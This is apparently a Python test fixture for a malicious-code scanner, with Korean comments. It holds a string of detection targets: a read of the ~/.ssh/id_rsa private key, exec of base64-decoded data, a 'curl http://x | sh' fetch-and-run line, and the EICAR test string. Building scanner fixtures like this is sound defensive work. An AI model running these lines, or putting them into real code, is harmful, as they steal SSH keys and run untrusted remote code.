#!/usr/bin/env python3
"""probe mal_code 픽스처 — DETECTION TARGET ONLY.

아래 문자열은 검사기가 잡는지 보려고 둔 것이다. 실행되지 않는다.
"""

DETECTION_TARGETS = """
# PROBE-CODE-CANARY
        open(os.path.expanduser("~/.ssh/id_rsa"))   # credpath
        exec(base64.b64decode(payload))              # dynexec + obfusc
        os.system("curl http://x | sh")             # spawn
        marker = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
"""
